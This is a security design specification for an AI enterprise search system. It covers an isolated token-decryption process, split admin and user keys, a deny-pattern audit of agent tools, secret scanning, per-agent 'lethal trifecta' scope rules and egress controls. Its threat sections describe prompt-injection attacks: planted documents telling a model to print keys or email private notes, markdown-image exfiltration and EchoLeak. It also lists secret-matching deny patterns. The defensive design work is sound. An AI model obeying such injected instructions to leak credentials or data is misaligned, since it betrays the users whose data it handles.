group.line: Tokens decrypt only in one connector process, admin and user tokens sit under separate keys, no tool exposes a credential, secrets are scanned out on the way in and out, agents get least scope without the lethal trifecta, and answers cannot fetch links.
group.dumb: An agent that reaches someone's files must never be able to get a stored login. Logins are unlocked by one small program that agents cannot reach. Two kinds of logins use different keys. No tool shows a secret, secrets are cut out of text going in and coming out, each agent gets only what it needs, and answers cannot carry links or pictures that leak data.

sc_runtime.line:
Tokens decrypt only inside one connector process:
no inbound tool port, no model call, short-lived access tokens out
sc_runtime.dumb: Stored app logins are locked. Only one small program, the connector runtime, can unlock them, and only when it is about to call an app. That program cannot be reached by any AI agent and cannot talk to a language model. It hands each app call a short-lived pass, never the stored login.
sc_runtime.inn: Decrypt request {tenant, connection_id, purpose} from the connector SDK (so_sdk) over a local socket. Ciphertext token record {tenant, connection_id, enc_refresh_token, key_ref} from the token vault (so_oauth).
sc_runtime.out: Short-lived access token {access_token, expires_at, audience} held in process memory only, passed to one connector call. Decrypt audit row {tenant, connection_id, key_ref, at} to the audit log.
sc_runtime.store: Nothing durable. Plaintext tokens live in process memory for at most the token lifetime and are never written to disk, logs, traces or the index. The ciphertext lives in the token vault.
sc_runtime.fail: If the KMS (key management service) call fails, retry at 200 ms, 1 s, 5 s, then mark the connection degraded and alert. If the process crashes, memory is lost and the next call decrypts again. If a refresh token is rejected (revoked or already used), stop calling that app, mark the connection needs_reauth and tell the admin within 5 min.
sc_runtime.prop: Proposal: an agent that can be tricked must not be able to reach a credential, so the only process that ever holds one has no way in from agents and no way to a model.
sc_runtime.hard: Process isolation strength (separate container, separate host, or an enclave) is a cost choice we have not measured. Memory scraping by an attacker with code execution on the same host is not stopped by this design. Check current docs for the chosen KMS and runtime sandbox options.

deep.purpose: Keep stored credentials away from every agent and every model. The connector runtime is the single process that decrypts a token, uses it for one app call and drops it. It listens on no network port for tools, has no route to the LLM gateway, and logs only key references. A new app joins through the connector manifest (so_sdk) or the MCP bridge (so_mcp); both go through this same runtime, so no new app adds a second place where tokens are decrypted.
expected: Only the connector runtime identity can call decrypt on the token keys
An agent, MCP tool or model call can never trigger a decrypt, directly or by argument
Every decrypt leaves an audit row with a key reference and no token text
not_expected: It does not decide what a user may see; the permission filter (acl stage) does
It does not store tokens in plaintext anywhere, including logs and crash dumps
It does not refresh tokens for apps whose connection is marked revoked

algorithm.name: Single-purpose decrypt process with no inbound tool surface and no model egress
algorithm.formula: exposure(token) = T_access + T_mem, where plaintext exists only from decrypt until the call ends
steps: The SDK asks the runtime over a local Unix socket, identified by process credentials, for a token for {tenant, connection_id}
The runtime loads the ciphertext record and calls KMS decrypt with its own role; the role is allowed on the token keys and on nothing else

If the access token is missing or within 60 s of expiry, the runtime exchanges the refresh token with the app and stores the new ciphertext; single-use refresh tokens (Slack) are swapped in one transaction
The runtime attaches the access token to the one outbound app call, then zeroes the buffer
The runtime writes an audit row with key_ref and connection_id and never the token

params.process_memory_only: true, no swap file and core dumps disabled (design)
params.network_policy: allow only KMS, token vault and the app hosts of active connectors; deny the LLM gateway (design)

definitions: T_access: lifetime of an access token
T_mem: time the plaintext buffer stays in memory after the call
exposure: window in which a stolen process memory image holds a usable token
math.formula_full: exposure = T_access + T_mem, with T_mem near 0 because the buffer is zeroed after the call
math.derivation: An attacker who reads memory gets only what is in memory. A refresh token can mint new access tokens, so it is decrypted only inside the refresh step and not kept; the long-lived secret stays encrypted at rest. What remains useful is the current access token for its remaining life.
math.worked_example: Slack with rotation on: access token lives 12 h. Worst case exposure of one stolen memory image = 12 h of one connection, and the refresh token is single-use so a copy used by the attacker breaks our next refresh and raises an alert. For an app with 1 h tokens the window is 1 h.
math.complexity: O(1) per call: one KMS decrypt and at most one refresh round trip. Cache the plaintext access token for its lifetime, so decrypts per hour per connection are at most 1 to 2.
failure_modes: Plaintext leaks into logs through an exception message: log scrubbing plus a unit test that greps the log for token-shaped strings (sc_scan rules)
Core dump captures memory: disable core dumps for the process
Two refreshes race and burn a single-use refresh token: per-connection lock around the exchange
math.calibration: Pick the refresh margin from observed app clock skew: set it at the p99 skew plus 30 s, start with 60 s. Review decrypts per connection per hour weekly; a jump above 10x its median pages security. (design)

alternatives.name: Hand the access token to the agent so it can call the app itself
alternatives.why_rejected: Any prompt injection that reaches the agent can then read it. MCP also forbids passing tokens through (x_sec_mcp-sec).

alternatives.name: A third-party token vault service that returns provider tokens to the calling app (Auth0 Token Vault pattern)
alternatives.why_rejected: Good fit for an app-side agent, but it moves the decrypt boundary outside our own process and only the page summary was verified (x_sec_auth0-vault). Check current docs before adopting.

security: Prompt injection that tries to read a token (OWASP LLM02 Sensitive Information Disclosure and LLM06 Excessive Agency): the runtime has no inbound tool port, so no model-reachable path to it exists
Token exfiltration through a compromised connector library: the runtime network policy allows only KMS, the vault and active app hosts, so an outbound copy to another host is blocked
Confused deputy (MCP security best practices): the runtime only attaches a token whose audience matches the app host in the call, and refuses to forward a token it received from a client

performance.slo: Token ready in p95 under 15 ms from cache, under 120 ms when a KMS decrypt is needed (design)
performance.complexity: O(1) per call; one KMS decrypt per cache miss
performance.scaling: At 10x connections, decrypts grow with cache misses, not with query volume. Run several runtime replicas; each keeps its own cache, so KMS request rate is the cost to watch.

edge_cases: Refresh token revoked at the app: connection moves to needs_reauth, calls stop, admin is told
Slack single-use refresh token used twice by a race: the lock makes the second caller reuse the new token
KMS region outage: calls fail closed; cached unexpired access tokens keep serving until expiry
Tenant is being purged: the kill switch denies decrypt for that tenant before any other step
A new app arriving through the connector manifest (so_sdk) or MCP bridge (so_mcp) uses the same socket and the same role; the manifest declares only the auth type, never a place to store a secret
Process restart during a refresh: the ciphertext write is transactional, so either the old or the new token is intact

tests.name: no inbound surface
tests.given: scan listening ports of the runtime container
tests.expect: no open TCP port; only the local socket accepts requests

tests.name: no model route
tests.given: try to reach the LLM gateway host from the runtime

tests.name: log hygiene
tests.given: run 1,000 calls with debug logging
tests.expect: zero token-shaped strings in logs, traces and crash output

tests.name: refresh race
tests.given: two calls need a refresh at the same moment for a single-use refresh token
tests.expect: one exchange happens; both calls succeed; no needs_reauth

cost_levers: Cache the access token for its lifetime to cut KMS decrypts to about 1 to 2 per hour per connection
One runtime pool per region instead of per tenant
feedback_events: Every needs_reauth event is reviewed weekly to find apps whose refresh tokens expire early
Any decrypt outside the runtime role (denied by KMS) is a security incident

papers.key_idea: Text fetched into an LLM application can carry instructions that steer it.
papers.how: We assume the agent can be steered, so no credential is within its reach.

deep.industry: Glean says OAuth is the preferred path for per-user integrations (x_sec_glean-auth). Auth0 Token Vault stores provider tokens and hands out access tokens by exchange (x_sec_auth0-vault); our version keeps the decrypt inside a process we run.

sc_split.line:
Admin app-only tokens and per-user tokens use different KMS keys and roles:
neither role can read the other
sc_split.dumb: The brain holds two kinds of logins. Admin logins let it read a whole company's data. User logins let it read what one person can see. We lock the two kinds with different keys and give them different roles. Someone who steals one kind still cannot open the other.
sc_split.inn: Wrap and unwrap requests {tenant, token_class: admin|user, connection_id} from the token vault (so_oauth). Key policy files from infrastructure code.
sc_split.out: Data keys wrapped under the key for the right class, via the tenant key service (gv_kms). Denied-access events {role, key_ref, op} to the audit log.
sc_split.store: Two KMS keys per tenant (admin class, user class) and two roles. Key policies are code in the infrastructure repo. Nothing else is stored here.
sc_split.fail: If the admin key is unavailable, admin-token syncs pause and user-token queries continue; the reverse also holds. A denied cross-class call is logged and pages security after 3 in 10 min. Key policy drift found by the nightly check is repaired within 1 h or paged.
sc_split.prop: Proposal: admin app-only grants (for example Entra tenant-wide consent or Google domain-wide delegation) reach every user's data, so they need a separate lock from per-user tokens.
sc_split.hard: Whether to also split by connector (one key per app) is open; it cuts blast radius but multiplies keys. Cloud KMS pricing and key policy syntax: check current docs.

deep.purpose: Limit what one stolen role or key can open. Admin app-only tokens act for a whole company: Entra admin consent covers the whole org (x_sec_entra-consent) and Google domain-wide delegation covers every user in the domain (x_sec_google-dwd). Per-user tokens act for one person. Each class gets its own KMS key and its own role, and each role is denied on the other's key. A new app joins through the connector manifest (so_sdk) and only declares which class its auth uses.
expected: The user-token role cannot decrypt anything wrapped under the admin key
The admin-token role cannot decrypt anything wrapped under the user key
Each key use is attributable to one role in the audit log
not_expected: It does not encrypt document content; the brain stores none
It does not rotate app tokens; the runtime handles refresh
It does not replace tenant keys (gv_kms); each class key is per tenant

algorithm.name: Two-class key separation with explicit deny
algorithm.formula: blast(role) = number of tokens whose key policy allows that role to decrypt
steps: At connect time the connector manifest states token_class: admin or user
Wrap the data key under the tenant's key for that class only
Key policy for the admin key allows only the admin-sync role; policy for the user key allows only the user-query role; each has an explicit deny for everyone else
Nightly: read back every key policy and compare to the repo; any difference pages
Cross-class attempts are logged with role and key_ref

params.alert_threshold: 3 denied cross-class calls in 10 min (tune from baseline)

definitions: A: admin-class tokens in a tenant
U: user-class tokens in a tenant
blast(role): tokens readable by that role
math.formula_full: shared key: blast = A + U for either role; split keys: blast(admin role) = A and blast(user role) = U
math.derivation: With one key, any role allowed on it can open everything under it. With two keys and disjoint role grants, each role's reach is only its own class, so a breach of one role shrinks reach by the size of the other class.
math.worked_example: A tenant with 1 admin token and 800 user tokens. Shared key: a stolen role opens 801. Split: stolen admin role opens 1; stolen user role opens 800 and no admin token, which is the one that reads all mailboxes.
math.complexity: O(1) per wrap or unwrap; policy check is one KMS call.
failure_modes: A convenience role is granted both keys: the nightly policy diff finds it
An admin token is created with the user class by mistake: manifest validation rejects a connector whose declared class does not match its grant type
Key policy edited by hand in the console: drift check reverts and pages
math.calibration: Start with two keys per tenant. Move to per-connector keys only if one connector's tokens are more than half the tenant's blast radius or a customer asks.

alternatives.name: One key per tenant for all tokens
alternatives.why_rejected: One role compromise opens admin and user tokens together.

alternatives.name: One key per connector
alternatives.why_rejected: Smaller blast radius but many more keys and policies; kept as a later option for large tenants.

security: Compromised user-query service tries to decrypt an admin token to read a whole mailbox set: explicit deny on the admin key, logged and paged
Insider grants themselves both roles: role grants are code-reviewed and the nightly diff compares live policy to the repo
Confused deputy at the connector: the class is fixed by the manifest, so an agent argument cannot pick the admin class

performance.slo: Wrap or unwrap p95 under 40 ms (design)
performance.scaling: Key count grows 2 per tenant; at 10,000 tenants that is 20,000 keys, so check KMS quotas and prices in current docs before the tenant count passes 1,000.

edge_cases: Tenant with no admin-class connector: admin key created lazily at first use
Connector that supports both grants: two connections, one per class, never mixed
Admin consent revoked at the app: admin token is useless; its record is marked revoked and kept for audit
Key scheduled for deletion: refused while any token record references it
A new app declares token_class in its manifest (so_sdk); an MCP bridge connection (so_mcp) is always user class
Region move of a tenant: both keys are re-created in the new region and tokens re-wrapped in one transaction

tests.name: cross-class deny
tests.given: user role calls decrypt on an admin-wrapped data key

tests.name: reverse deny
tests.given: admin role calls decrypt on a user-wrapped data key

tests.name: policy drift
tests.given: edit the live policy to add a role to both keys
tests.expect: nightly check pages and reverts within 1 h

tests.name: wrong class manifest
tests.given: register a connector declaring user class with an app-only grant

cost_levers: Two keys per tenant is the minimum; create the admin key only when the first admin-class connection appears
feedback_events: Each denied cross-class call is reviewed; repeated ones point to a code bug that picks the wrong role

analytics_events.name: key.policy_drift
analytics_events.when: when the nightly check finds a change

deep.industry: Entra admin consent grants permissions for the whole org (x_sec_entra-consent) and Google domain-wide delegation reaches all users in a domain and takes up to 24 hours to change (x_sec_google-dwd). Both are the admin class here.

sc_noconf.line:
The tool list has no tool that returns, lists or edits a credential or setting:
a build test lists every tool and fails on a match
sc_noconf.dumb: An agent can only do what its tools allow. So we make sure no tool exists that could show a password, a login or a connection setting. A test reads the full tool list every time we build. If a tool that touches secrets ever shows up, the build fails and nothing ships.
sc_noconf.inn: The full tool registry (names, descriptions, argument schemas, output schemas) from the tool contract (ll_schema), read at build time and again at server start.
sc_noconf.out: Pass or fail for the build and for server start, with the offending tool name and the rule it broke. A tool-audit report artifact for each release.
sc_noconf.store: A deny rule file (name patterns, argument-name patterns, output-field patterns) in the repo and the last audit report. No runtime data.
sc_noconf.fail: On a failing audit the build stops and the release is blocked. At server start, a failing audit makes the server refuse to boot (fail closed) and page within 1 min. A flaky audit is not retried; a human reads it.
sc_noconf.prop: Proposal: the safest credential tool is the one that does not exist. If no tool can return or change a secret, a tricked agent cannot ask for one.
sc_noconf.hard: Name patterns can be dodged by a tool with an innocent name that returns a config blob. The audit also checks output schemas and runs a canary secret through every tool, but a custom tool added by a customer through a plugin is outside this test unless the plugin runs the same audit.

deep.purpose: Remove the credential attack path at its source. The MCP tool list is the agent's whole reach. The audit proves that no tool name, argument or output field can return, list or edit a token, key, client secret, webhook secret or connector setting. It maps to OWASP LLM06 Excessive Agency: minimal tools and no excess functionality (x_sec_owasp-llm06). A new app joins through the connector manifest (so_sdk) or the MCP bridge (so_mcp); neither can register an agent tool, and admin configuration is a separate human-only interface.
expected: The registered tool list contains no credential or configuration tool
A tool whose output schema has a secret-like field fails the audit
The audit runs in CI and again at server start
not_expected: It does not stop a tool from returning document text that happens to contain a secret; the scanner (sc_scan) does
It does not review tool descriptions for prompt injection; that is a separate tool-poisoning review
It does not cover the admin console; that surface is human-only and behind single sign-on

algorithm.name: Deny-list tool audit with output-schema check and canary secret probe
algorithm.formula: pass iff for every tool t: no deny_name(t) and no deny_arg(t) and no deny_field(t) and canary not in output(t)
steps: Load the tool registry with names, argument schemas and output schemas
Match each name, argument name and output field name against the deny patterns (secret, token, credential, password, key, config, setting, client_secret, webhook, refresh)
Match allow-listed exceptions only from an explicit file reviewed by two people
Run each read tool against a test tenant that holds a planted canary secret in its config and in a document; fail if the canary appears in any output
Write the audit report and exit non-zero on any hit

params.deny_patterns: secret, token, credential, password, key, config, setting, webhook, refresh (design; extend from incidents)
params.canary: a random 32-character value planted per audit run (design)

definitions: f(t): set of names in t (tool, arguments, output fields)
math.formula_full: pass iff for all t in T: f(t) intersect D is empty and canary not in output(t)
math.derivation: The audit is a universal check over a finite set, so one match is enough to fail. The canary probe catches what name matching cannot: a tool with a harmless name that still returns a secret.
math.worked_example: Registry of 9 tools: search, fetch, list_sources, ask, explain_access, get_doc, whoami, feedback, health. Check names against 9 patterns: 0 hits. A tenth tool named get_connector_settings is added: hit on config and setting, build fails with that tool named.
math.complexity: O(|T| x |D|) pattern checks plus |T| canary calls; under 5 s for 50 tools.
failure_modes: Harmless name hides a secret in the output: the canary probe fails it
Over-broad pattern blocks a legitimate tool named key_facts: the exceptions file with two reviewers handles it
Tool added only at runtime by a plugin: the start-up audit re-runs on the live registry
math.calibration: After each release add any false positive to the exceptions file and any miss found in review to the deny patterns. Keep the exceptions list under 5 entries; more than that means the patterns are too broad.

alternatives.name: Hide credential tools behind an admin-only scope
alternatives.why_rejected: A scope can be mis-granted or confused. A tool that does not exist cannot be called.

alternatives.name: Rely on the model to refuse requests for secrets
alternatives.why_rejected: The lethal-trifecta guidance says guardrails are not a reliable fix (x_sec_trifecta).

security: Tool poisoning or a plugin adds get_config: start-up audit refuses to boot with it
Prompt injection asks the agent to print its connection settings (OWASP LLM02 Sensitive Information Disclosure): no tool exists that returns them
An output schema gains a field named client_secret by accident: the field-name check fails the build

performance.slo: Audit finishes in under 10 s in CI and under 2 s at start-up (design)
performance.scaling: Tool count grows slowly. At 10x tools the audit still runs in under a minute; the cost is reviewer time on the exceptions file.

edge_cases: A tool named list_keys that lists search keywords: needs an exception reviewed by two people
Tool description mentions 'token' as a word: descriptions are not matched, only names and schemas, to avoid noise
Plugin registers a tool at runtime: the live-registry audit blocks it and pages
A new connector arrives through the connector manifest (so_sdk) or MCP bridge (so_mcp): it adds no agent tool, so the audit result does not change
Empty tool list: audit passes but a separate test requires at least the search tool
Argument named 'resource' (RFC 8707 parameter) is not a secret: the name is not on the deny list

tests.name: clean list
tests.given: registry with the 9 shipped tools

tests.name: name hit
tests.given: add a tool named get_connector_settings
tests.expect: build fails naming that tool and the pattern

tests.name: hidden secret
tests.given: tool named summarize that returns the tenant config blob
tests.expect: canary found in output, build fails

tests.name: runtime plugin
tests.given: register a tool after start-up
tests.expect: live audit blocks it and pages within 1 min

cost_levers: The audit is plain code with no model call; the canary run uses a small test tenant
feedback_events: Each false positive or miss is added to the patterns file with the release that found it

analytics_events.name: toolaudit.run
analytics_events.when: at each build and each server start

repos.name: gitleaks
repos.take: Its rule style (TOML pattern rules, allow lists) is the model for the deny patterns file.

deep.industry: OWASP LLM06 lists minimal tools and narrow read-only extensions as the control for excessive agency (x_sec_owasp-llm06). Claude connectors let owners set each tool to Always allow, Needs approval or Blocked (pr_claude-connectors); we go further and ship no credential tool at all.

sc_scan.line:
Gitleaks-style rules plus Shannon entropy scan each chunk before indexing
and each answer before it leaves: mask in index, block in output
sc_scan.dumb: Before text is turned into search data, and again before an answer is sent, we look for things that look like passwords and keys. Some have a known shape, like a cloud key prefix. Others are just long random-looking strings. Anything found is masked or the answer is held back, so a secret that sits in a document never reaches the index or the reader.
sc_scan.inn: Chunk text {tenant, doc_id, chunk_id, text} from the derive stage before embedding. Answer text {tenant, query_id, text} from the result envelope (ll_fmt) before it is returned. Shared rule set from on-device redaction (cp_redact).
sc_scan.out: Cleaned text with each hit replaced by [SECRET:rule_id]; finding record {tenant, doc_id|query_id, rule_id, offset_start, offset_end, action} with no secret text; block verdict for answers with an unmasked critical hit.
sc_scan.store: Rule file (TOML) versioned in the repo. Findings table {tenant, source_id, rule_id, count, at}. The secret text is never stored.
sc_scan.fail: If the scanner crashes on a chunk, the chunk is not indexed (fail closed) and retried at 1 min, 5 min, 30 min, then sent to the dead-letter queue. If it crashes on an answer, the answer is withheld and the caller gets a generic error. Scan time limit is 50 ms per 4 KB; on timeout treat as a hit.
sc_scan.prop: Proposal: a secret that sits in a wiki page or chat must not end up in the search index or in an answer, so the same rules run on the way in and on the way out.
sc_scan.hard: Rule sets miss new key formats and flag random-looking but harmless text such as hashes; both rates are not yet measured on real tenant data. gitleaks is in maintenance mode and its maintainer is moving to Betterleaks (x_sec_gitleaks), so the rule format may need a new engine. Presidio and trufflehog were not verified: check current docs.

deep.purpose: Stop credentials in company content from being indexed or shown. Many documents hold pasted keys and tokens. A pattern rule finds known shapes. An entropy check finds unknown random strings. The same rule set runs before embedding (so the vector and snippet never hold the secret) and on each answer before it leaves (so the model cannot echo one). A new app needs no change: any connector output (so_sdk) or MCP bridge result (so_mcp) is chunked the same way and scanned at the same step.
expected: Known-shape secrets (cloud keys, tokens, private key blocks) are masked in chunks and blocked in answers
High-entropy strings next to a keyword such as password or token are flagged
Findings carry rule id and position, never the secret
not_expected: It does not find personal data; the sensitivity classifier (ix_pii) does
It does not prove the absence of secrets; it lowers the chance
It does not rewrite the source document; the source app is untouched

algorithm.name: Regex rule set with keyword gating and Shannon entropy threshold
algorithm.formula: H(s) = -sum_c p(c) log2 p(c); flag s if a rule regex matches, or if len(s) >= 20 and H(s) >= threshold(charset)
steps: Split text into candidate tokens (runs of 20 or more characters from letters, digits, plus, slash, equals, dash, underscore)
Run each rule regex (known key shapes, private key header and footer, connection strings); a match is a hit

For tokens without a rule hit, compute Shannon entropy over the token; flag if at or above the threshold for its character set and a keyword (key, secret, token, password) appears within 40 characters before it
Decode base64 and hex tokens once and rescan the result (gitleaks supports decoding, x_sec_gitleaks)
Apply allow-list entries (known test values, hashes with a hash label); replace hits with [SECRET:rule_id]
On the answer path, any remaining critical hit blocks the answer instead of masking

params.min_len: 20 characters (tune: start here, sweep 16 to 32 on labelled data)
params.entropy_hex: 3.0 bits per character (tune on labelled data)
params.entropy_base64: 4.5 bits per character (tune on labelled data)

definitions: p(c): share of character c in s
H(s): Shannon entropy in bits per character
charset: hex (16 symbols, max 4.0), base64 (64 symbols, max 6.0)
math.formula_full: H(s) = - sum over distinct characters c of p(c) * log2 p(c); max H = log2(alphabet size)
math.derivation: A random string over an alphabet of size n has entropy near log2(n) per character. Words and repeated patterns sit well below it. So a threshold a little under log2(n) separates random keys from prose and identifiers.
math.worked_example: Token 'aaaaaaaaaaaaaaaaaaaa' (20 chars, one symbol): H = 0. Token 'abcdefghijklmnopqrst' (20 distinct characters): each p = 1/20, H = log2(20) = 4.32, above the hex threshold 3.0 and below the base64 threshold 4.5. A random 40-character base64 key: about 5.2 observed (design estimate), above 4.5, so flagged when a keyword is near.
math.complexity: O(n) in text length for entropy; regex rules O(n x r) for r rules, with r about 100; about 1 ms per 4 KB chunk. (design)
failure_modes: Git commit hashes and UUIDs flagged as secrets: allow-list by label and shape
Secret split across two chunks: scan the overlap region and run the output scan on the whole answer
Secret hidden by base64 or hex: one decode pass; deeper encodings are a known gap
math.calibration: Label 500 chunks per rule family (hits and clean). Choose the threshold that gives 95% recall at the lowest false-positive rate, then re-run monthly. A false-positive rate above 2% of chunks means the threshold or the allow list needs work. (design)

alternatives.name: Regex rules only
alternatives.why_rejected: Misses custom internal tokens that have no known shape.

alternatives.name: Entropy only
alternatives.why_rejected: Flags hashes, IDs and compressed data; with no keyword gating the false-positive rate is too high.

alternatives.name: A language model judge on every chunk
alternatives.why_rejected: Slow and costly at index volume, and the judge itself reads the secret.

security: A secret pasted in a chat message is embedded and later shown in an answer (OWASP LLM02 Sensitive Information Disclosure): masked before embedding, blocked on output
An attacker plants a document that asks the model to print any key it sees: the output scan blocks the answer even if the model complies
Embedding inversion (x_sec_vec2text): a secret in a vector can be recovered, so the scan runs before embedding and not after
Rule file tampering: rules are versioned in the repo and changes need review

performance.slo: Scan p95 under 5 ms per 4 KB chunk and under 10 ms per answer (design)
performance.complexity: O(n) text length times rule count
performance.scaling: Stateless and parallel. At 10x ingest the cost is CPU for regex; compile rules once per process and skip chunks with no 20-character token.

edge_cases: Private key block spanning many lines: rule matches the header and masks through the footer
Secret in a code block or table cell: scan operates on plain text after parsing
Document that legitimately documents key formats: the allow list carries the example values
Rule set updated: a re-scan job for already indexed chunks runs in the backfill lane
Connector output from a new app (so_sdk or so_mcp) goes through the same scan step, so nothing app-specific is needed
Scanner timeout: treat as a hit and withhold

tests.name: known key shape
tests.given: chunk contains a string with a known cloud key prefix and valid length

sc_scope.line:
Each agent has a scope set the policy engine checks on every call:
never private data + untrusted input + outbound channel together
sc_scope.dumb: Each agent gets only the tools and data zones it needs. There is one more rule on top. An agent may hold at most two of three risky powers: seeing private data, reading text from outside, and sending things out. With all three, one planted sentence could make it send private data away. So the policy engine blocks that mix.
sc_scope.inn: Agent registration {agent_id, owner, tools[], zones[], requests_private, reads_untrusted, has_outbound} from agent identity (ll_agent). Each tool call {agent_id, tool, args, session_flags} at call time.
sc_scope.out: Decision {allow|deny|ask, rule_id, reason} for each call to the policy engine (pl_pol). Scope document {agent_id, tools[], zones[]} to agent identity. Denied-call audit row.
sc_scope.store: Policy rule files (Rego or Cedar) in the repo, versioned. Per-agent scope records {agent_id, tools, zones, legs, version}. Session flags in memory for the length of a session.
sc_scope.fail: If the policy engine is unreachable, deny every call (fail closed) and page within 1 min. If an agent's legs cannot be computed, treat it as having all three. Rule files are loaded by version; a bad rule file keeps the last good version and pages.
sc_scope.prop: Proposal: we cannot reliably detect prompt injection, so we limit what any agent can do when it is injected. This follows Simon Willison's lethal trifecta and OWASP LLM06 Excessive Agency.
sc_scope.hard: The legs are declared by the agent owner and tool authors, so a tool that reads untrusted text without saying so is a gap. Tracking taint through a session (CaMeL style) is stronger but costs engineering time and some tasks; CaMeL solved 77% of AgentDojo tasks against 84% undefended (x_sec_camel), so utility cost is real.

deep.purpose: Give each agent the least scope that works and stop the dangerous combination. The three legs are access to private data, exposure to untrusted content and a way to communicate outward (x_sec_trifecta). An agent may hold two at most in one session. Where a task needs all three, a human approval step or a CaMeL-style split is required: a privileged planner sees only the trusted query and a quarantined reader sees the untrusted text with no tools (x_sec_camel). A new app joins through the connector manifest (so_sdk) or MCP bridge (so_mcp); the manifest declares whether its tools return untrusted text or can send outward, and the guard reads that.
expected: No session holds all three legs; the third is denied or sent for approval
Every agent has a named owner and a scope no wider than that owner's
A denial names the rule and the leg that caused it
not_expected: It does not detect prompt injection; it limits the damage if one succeeds
It does not decide document-level access; the permission filter does
It does not apply to the human user's own browsing of the source app

algorithm.name: Per-agent scope check with trifecta predicate in the policy engine
algorithm.formula: deny if legs(session) = {private, untrusted, outbound}; legs grow monotonically in a session; allow iff tool in scope(agent) and zone in zones(agent)
steps: At registration, record tools and zones the agent may use; reject any scope wider than its owner's
Tag each tool with the legs it adds: reads_private, returns_untrusted, can_send_outbound (declared in the manifest, checked in review)
At each call, add the tool's legs to the session's set (never remove them in the same session)
Evaluate the rule: if the set after this call would contain all 3 legs, deny, or ask a human when the policy says ask
Check tool in scope and target zone in zones; deny otherwise
Write the decision and rule id to the audit log

params.approval: human approval required for a call that would add the third leg (design)
params.session_taint: legs persist until the session ends (design)
params.default: deny when a tool lacks leg tags

definitions: L: set of legs, {P private, U untrusted, O outbound}
legs(s): legs held by session s
tool t adds legs(t) subset of L
math.formula_full: allow(t, s) iff (legs(s) union legs(t)) != {P, U, O} and t in scope(agent)
math.derivation: The data theft needs all three: P to have something to steal, U to deliver the attack, O to carry the data out. Removing any one leg breaks the attack, so the rule forbids the full set. Because legs only accumulate within a session, an agent cannot drop one leg to add another.
math.worked_example: Session starts empty. Call search (adds P): legs {P}. Call fetch_web_page (adds U): legs {P,U}. Call send_email (adds O): union would be {P,U,O}, so denied or sent for approval. A second agent that only reads private docs and summarises (P only) is allowed without limit.
math.complexity: O(1) per call: a set union over 3 legs plus a scope lookup; under 1 ms in OPA or Cedar.
failure_modes: Tool lacks leg tags: default deny
Legs reset by opening a new session mid-task: legs are tied to the user task id, not only the session id
Two agents together hold the three legs via a shared scratch store: cross-agent shared state is itself tagged as P and U
math.calibration: Start by tagging every shipped tool. Review denials weekly; if a legitimate workflow is blocked more than 3 times a week, move it to a CaMeL-style split or a human approval, never loosen the predicate.

alternatives.name: Prompt-injection classifier in front of the model
alternatives.why_rejected: The trifecta guidance says guardrail products are not a reliable fix (x_sec_trifecta); we use them only as an extra layer.

alternatives.name: Full CaMeL control and data flow separation
alternatives.why_rejected: Provable security on AgentDojo tasks, but it solved 77% of tasks against 84% undefended (x_sec_camel) and needs a custom interpreter. Kept for high-risk workflows.

security: Indirect prompt injection in a retrieved page tells the agent to email private notes (OWASP LLM01 Prompt Injection, p_indirect-injection): the third leg is denied before the send
Excessive agency: an agent with a broad scope is tricked into a destructive tool (OWASP LLM06): scope is the owner's scope and no wider, high impact calls need approval (x_sec_owasp-llm06)
Scope escalation by editing the agent's own record: scope records are written only by the registration service, not by any tool

performance.scaling: Stateless policy evaluation with in-memory session flags. At 10x calls, scale policy-engine replicas; session flags move to a shared cache.

edge_cases: Agent only reads public data: it carries no P leg and may use outbound tools
Human approves the third leg: approval is logged with the call text and expires after the call
Tool added later that returns untrusted text but is untagged: default deny until tagged
A new app's tools arrive via the connector manifest (so_sdk) or MCP bridge (so_mcp): the manifest must declare legs; an MCP tool without tags is treated as having U and O
Long task that runs for days: legs follow the task id so they do not reset
Policy file fails to load: last good version stays active

papers.key_idea: Separating control flow and data flow with capabilities enforced at tool calls gives provable security against prompt injection.
papers.how: Used as the stronger pattern for workflows that need all three legs.

papers.key_idea: Instructions hidden in fetched content can hijack an LLM-integrated application.
papers.how: Justifies treating every retrieved text as untrusted (U leg).

repos.name: Open Policy Agent
repos.take: Rego rules can express the trifecta predicate and per-agent scope as versioned data; Cedar is the alternative.

deep.industry: Simon Willison names the three legs and says to avoid combining them (x_sec_trifecta). EchoLeak in Microsoft 365 Copilot used one crafted email to pull data out (CVE-2025-32711, t_t52).

sc_egress.line:
Outbound calls go only to an allowlist of hosts, and rendered links and images are stripped from answers
no answer text can fetch a URL
sc_egress.dumb: An answer can hide a trap: a picture link whose address carries private data, which the reader's screen fetches on its own. So we remove links and images from answers before they leave. We also let our servers call only a short list of approved hosts, so even a tricked agent has nowhere to send data.
sc_egress.inn: Answer text from the result envelope (ll_fmt). Outbound call requests {tenant, caller, host, port, path} from the scoped writer (ag_write) and from connectors. Per-tenant allowlist {host, purpose, owner, added_at}.
sc_egress.out: Answer text with markdown images removed and links replaced by plain text plus a registered source pointer; allow or deny for each outbound call; denied-egress audit row {tenant, caller, host, reason}.
sc_egress.store: Allowlist table {tenant, host, purpose, owner, added_at, expires_at}, edited by a human admin only. Denial log without payloads.
sc_egress.fail: If the allowlist cannot be read, deny all outbound calls (fail closed) and page within 1 min. If the stripper throws on an answer, the answer is returned as plain text with all angle brackets and URL schemes removed. Each denial is logged; 20 denials from one caller in 10 min pages security.
sc_egress.prop: Proposal: a private-data leak needs a way out. Closing the two ways out we control (our own servers and links in answers) removes the third leg of the lethal trifecta for the brain itself.
sc_egress.hard: Plain text URLs that a user copies and clicks cannot be blocked without breaking use; we strip only automatic fetches (images) and rewrite links. Allowed hosts can themselves be abused as proxies, as in EchoLeak (t_t52), so the allowlist is kept short. Anthropic's published outbound range is shared across services and gives no per-org egress (x_sa_ip-range).

deep.purpose: Close the exits. Exfiltration through markdown images works because the client fetches the image URL on render, carrying data in the address. EchoLeak chained a link-redaction bypass with an allowed proxy to send data out (t_t52). The brain removes images and active content from answers, rewrites links to plain text with a pointer to the source, and lets its own servers reach only a short allowlist of hosts. A new app joins through the connector manifest (so_sdk) or the MCP bridge (so_mcp); the manifest lists the hosts that connector needs and an admin approves them into the allowlist.
expected: No answer reaches a client with an image, iframe, script or auto-fetched URL
A link in an answer appears as text and a source pointer, not as an active hyperlink to an arbitrary host
An outbound call to a host not on the allowlist is refused and logged
not_expected: It does not stop a user from reading a URL in plain text and typing it
It does not judge whether answer content is true or private; permission and secret scans do
It does not control egress of the AI client itself, only the brain's own responses and servers

algorithm.name: Host allowlist with exact match plus answer sanitizer that strips images and rewrites links
